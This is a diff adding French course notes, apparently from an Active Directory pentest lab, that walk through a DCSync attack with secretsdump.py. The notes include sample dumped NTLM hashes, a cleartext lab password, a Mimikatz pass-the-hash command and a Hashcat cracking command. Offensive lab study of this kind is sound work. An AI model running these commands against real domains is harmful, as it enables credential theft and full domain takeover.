@@ -3613,6 +3613,112 @@ Une fois les hash NTLM obtenus, plusieurs attaques sont possibles :
 ✔️ On a vu comment exploiter les hash NTLM pour escalader les privilèges
 
 🔥 DCSync est une attaque redoutable qui permet une compromission totale du domaine Active Directory ! 🔥
+
+🔓 Extraction des Hash NTLM et des Clés Kerberos avec secretsdump.py
+Maintenant que nous avons confirmé que l'utilisateur adunn possède les droits de réplication, nous allons extraire les hashs NTLM et les clés Kerberos des comptes du domaine Active Directory.
+
+🛠️ 1. Exécution de secretsdump.py pour récupérer les hash
+Nous utilisons Impacket et l'outil secretsdump.py pour exécuter l'attaque DCSync et récupérer les identifiants des comptes.
+
+Commande d'extraction :
+```bash
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+```
+💡 Explication des paramètres :
+✔️ -outputfile inlanefreight_hashes → Sauvegarde les résultats dans des fichiers.
+✔️ -just-dc → Extrait uniquement les hashs des comptes du domaine.
+✔️ INLANEFREIGHT/adunn@172.16.5.5 → Compte utilisé (adunn) et IP du DC.
+
+📋 2. Résultat de l'attaque
+✔️ secretsdump.py extrait les hashs NTLM et les clés Kerberos des comptes du domaine.
+
+Exemple de sortie :
+
+```ruby
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+```
+💡 Analyse des résultats :
+✔️ administrator:500 → Le hash NTLM du compte Administrateur est récupéré 🔥
+✔️ krbtgt:502 → Extraction du compte Kerberos (utile pour une attaque Golden Ticket 🎫)
+✔️ Tous les comptes de l’Active Directory sont listés avec leurs hash NTLM !
+
+🔥 3. Extraction des mots de passe en clair
+Dans certains cas, secretsdump.py peut extraire directement des mots de passe en clair si l’option réversible est activée dans Active Directory.
+
+✔️ Dans notre cas, nous avons obtenu un mot de passe en clair pour proxyagent :
+
+```makefile
+proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
+```
+💡 Pourquoi est-ce important ?
+📌 Aucun besoin de cracker le hash → On peut directement utiliser le mot de passe pour se connecter 🎯
+
+📂 4. Les fichiers générés
+Après l’exécution de secretsdump.py, trois fichiers sont créés :
+
+Commande pour lister les fichiers générés :
+```bash
+ls inlanefreight_hashes*
+```
+✔️ Fichiers obtenus :
+
+inlanefreight_hashes.ntds → Contient les hashs NTLM des comptes AD 🔐
+inlanefreight_hashes.ntds.cleartext → Contient les mots de passe en clair (si disponibles) 🔓
+inlanefreight_hashes.ntds.kerberos → Contient les clés Kerberos pour attaquer les tickets 🎫
+🎭 5. Options avancées pour secretsdump.py
+Nous pouvons filtrer les résultats avec différentes options :
+
+✔️ Extraction uniquement des hash NTLM :
+
+```bash
+secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5
+```
+✔️ Extraction des données pour un utilisateur spécifique :
+
+```bash
+secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
+```
+✔️ Vérification de la dernière modification du mot de passe :
+
+```bash
+secretsdump.py -pwd-last-set INLANEFREIGHT/adunn@172.16.5.5
+```
+✔️ Extraction de l'historique des mots de passe :
+
+```bash
+secretsdump.py -history INLANEFREIGHT/adunn@172.16.5.5
+```
+📌 Pourquoi est-ce utile ?
+Ces options permettent d’analyser la sécurité des mots de passe et de cibler les comptes actifs 🔥
+
+🚀 6. Exploitation des hash récupérés
+Une fois les hashs NTLM obtenus, plusieurs attaques sont possibles :
+
+✔️ Pass-the-Hash – Utiliser le hash pour se connecter directement sans le mot de passe 🛠️
+✔️ Crack du hash – Avec Hashcat pour retrouver le mot de passe en clair 🔑
+
+💡 Exemple d’attaque Pass-the-Hash avec Mimikatz :
+
+```powershell
+mimikatz "sekurlsa::pth /user:Administrator /domain:INLANEFREIGHT.LOCAL /ntlm:88ad09182de639ccc6579eb0849751cf"
+```
+💡 Exemple de crack des hash NTLM avec Hashcat :
+
+```bash
+hashcat -m 1000 inlanefreight_hashes.ntds /usr/share/wordlists/rockyou.txt --force
+```
+📢 Résumé rapide
+✔️ On a extrait les hashs NTLM et clés Kerberos avec secretsdump.py 🔐
+✔️ On a obtenu un mot de passe en clair 🔓
+✔️ On a exploré les fichiers générés et les options avancées
+✔️ On a vu comment exploiter les hashs NTLM avec Pass-the-Hash et Hashcat 🚀
+
+🔥 Avec ces informations, on peut prendre le contrôle total d'Active Directory ! 🔥
 ## Stacking The Deck
 
 ## Why So Trusting?
